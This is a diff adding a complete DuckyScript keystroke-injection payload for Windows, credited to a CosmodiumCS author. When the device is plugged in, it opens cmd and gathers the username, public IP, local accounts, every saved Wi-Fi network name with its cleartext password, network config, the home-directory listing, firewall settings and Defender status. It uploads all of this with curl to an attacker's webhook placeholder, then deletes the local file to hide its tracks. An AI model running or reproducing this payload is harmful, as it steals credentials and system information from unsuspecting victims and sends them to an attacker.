@@ -1,0 +1,43 @@
+REM Author: sysgerm @ CosmodiumCS
+GUI r
+DELAY 200
+STRING C:\Windows\System32\cmd.exe
+ENTER
+DELAY 500
+STRING cd %HOMEPATH%
+ENTER
+STRING whoami > slimmerkimmer.txt
+ENTER
+STRING curl ident.me >> slimmerkimmer.txt
+ENTER
+STRING net users >> slimmerkimmer.txt
+ENTER
+STRING echo --------------------------------------------------- >> slimmerkimmer.txt
+ENTER
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | netsh wlan show profiles %j key=clear | findstr /C:"SSID name" /C:"Key Content" >> slimmerkimmer.txt
+ENTER
+STRING echo --------------------------------------------------- >> slimmerkimmer.txt
+ENTER
+STRING ipconfig /all >> slimmerkimmer.txt
+ENTER
+STRING echo --------------------------------------------------- >> slimmerkimmer.txt
+ENTER
+STRING dir %HOMEPATH% >> slimmerkimmer.txt
+ENTER
+STRING echo --------------------------------------------------- >> slimmerkimmer.txt
+ENTER
+STRING netsh firewall show config >> slimmerkimmer.txt
+ENTER
+STRING echo --------------------------------------------------- >> slimmerkimmer.txt
+ENTER
+STRING sc query windefend >> slimmerkimmer.txt
+ENTER
+STRING echo --------------------------------------------------- >> slimmerkimmer.txt
+ENTER
+STRING curl.exe -F "payload_json={\"username\": \"Daddy got that LOOT\", \"content\": \"**Info gathered**\"}" -F "file=@slimmerkimmer.txt" YOUR WEBHOOK
+ENTER
+STRING del slimmerkimmer.txt
+ENTER
+STRING exit
+ENTER
+
